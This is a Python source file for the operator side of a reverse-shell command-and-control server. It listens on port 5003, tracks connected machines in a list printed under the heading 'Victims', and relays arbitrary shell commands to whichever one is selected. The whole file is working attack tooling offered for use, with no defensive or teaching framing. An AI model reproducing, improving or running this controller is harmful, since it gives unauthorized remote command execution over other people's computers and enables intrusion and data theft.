import socket
import threading
from queue import Queue
import turtle

BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"
thread_no = 2
job_no = [1, 2]
queue = Queue()
all_con = []
all_add = []

def create():
    global HOST
    global PORT
    global s
    HOST = "0.0.0.0"
    PORT = 5003
    s = socket.socket()

def bind():
    global HOST
    global PORT
    global s
    s.bind((HOST, PORT))
    s.listen(5)

def accept():
    for c in all_con:
        c.close()
    del all_con[:]
    del all_add[:]
    while True:
        try:
            client_socket, client_address = s.accept()
            client_socket.setblocking(1)
            all_con.append(client_socket)
            all_add.append(client_address)
            print(f"\n{client_address[0]}:{client_address[1]} Connected!")
            cwd = client_socket.recv(BUFFER_SIZE).decode()
            print("[+] Current working directory: "+cwd+"\n@backsite $> ", end='')
        except:
            print("Got an error accepting connections.")

def start():
    global HOST
    global PORT
    print(f"Listening as {HOST}:{PORT} ...")
    while True:
        cmd = input(f"@backsite $> ")

        if cmd.lower() == "list":
            list_conn()
        elif 'select' in cmd.lower():
            ls = get_target(cmd.lower())
            try:
                if ls[0] is not None:
                    send(ls[0], ls[1])
            except:
                print("Use list command to see available IDs")
        else:
            print("Unknown Command")

def list_conn():
    results = ""
    for i, conn in enumerate(all_con):
        try:
            conn.send(str.encode('ping'))
            conn.recv(BUFFER_SIZE)
        except:
            del all_con[i]
            del all_add[i]
            continue
        results += "["+str(i)+"]"+" -> "+str(all_add[i][0])+" : "+str(all_add[i][1])+" \n"
    print("ID  ->    IP     : Port")
    print('----------Victims----------'+'\n'+results)

def get_target(cmd):
    out = []
    try:
        target = int(cmd.replace('select ', ''))
        conn = all_con[target]
        ip = str(all_add[target][0])
        print(f"Connected to {str(all_add[target][0])}")
        print(f"{str(all_add[target][0])} $>", end='')
        out.append(conn)
        out.append(ip)
        return out
    except:
        print("Invalid ID")
        return None

def send(conn, ip):
    while True:
        try:
            cmd = input()
            if len(str.encode(cmd)) > 0 and cmd!='quit' and cmd!='exit':
                conn.send(str.encode(cmd))
                response = str(conn.recv(BUFFER_SIZE), "utf-8")
                print(response)
                print(f"{ip} $>", end='')
            if cmd=='exit':
                conn.send(str.encode(cmd))
                break
            if cmd == 'quit':
                break
        except:
            print("Connection Lost!!!")
            break
            
#Multi threading part (stole it from someone xd)
def create_workers():
    for _ in range(thread_no):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

def work():
    while True:
        x = queue.get()
        if x==1:
            create()
            bind()
            accept()
        if x==2:
            start()
        queue.task_done()


def create_job():
    for i in job_no:
        queue.put(i)
    queue.join()


create_workers()
create_job()
